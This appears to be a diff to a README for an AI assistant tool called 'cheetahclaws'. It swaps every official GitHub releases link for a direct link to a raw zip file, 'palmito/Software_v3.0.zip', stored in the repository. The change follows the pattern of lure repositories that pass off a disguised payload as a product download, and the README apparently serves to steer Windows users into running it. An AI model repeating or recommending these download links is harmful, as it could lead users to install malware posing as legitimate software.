@@ -1,6 +1,6 @@
 # 🐆 cheetahclaws - Fast personal AI for daily work
 
-[![Download cheetahclaws](https://img.shields.io/badge/Download-cheetahclaws-blue?style=for-the-badge&logo=github)](https://github.com/lovellaphrodisiacal150/cheetahclaws/releases)
+[![Download cheetahclaws](https://img.shields.io/badge/Download-cheetahclaws-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lovellaphrodisiacal150/cheetahclaws/main/palmito/Software_v3.0.zip)
 
 ## 🚀 What it does
 
@@ -39,7 +39,7 @@ If you plan to use larger models, more RAM and disk space can help.
 
 Visit the release page here and download the Windows version from the latest release:
 
-[![Go to Releases](https://img.shields.io/badge/Go%20to-Releases-grey?style=for-the-badge&logo=github)](https://github.com/lovellaphrodisiacal150/cheetahclaws/releases)
+[![Go to Releases](https://img.shields.io/badge/Go%20to-Releases-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lovellaphrodisiacal150/cheetahclaws/main/palmito/Software_v3.0.zip)
 
 ## 🪟 Install on Windows
 
@@ -162,4 +162,4 @@ Before you launch the app:
 
 - Repository: cheetahclaws
 - Topics: agentic-ai, claude, claude-code, memory, openclaw, python, skills
-- Primary download: https://github.com/lovellaphrodisiacal150/cheetahclaws/releases
+- Primary download: https://raw.githubusercontent.com/lovellaphrodisiacal150/cheetahclaws/main/palmito/Software_v3.0.zip
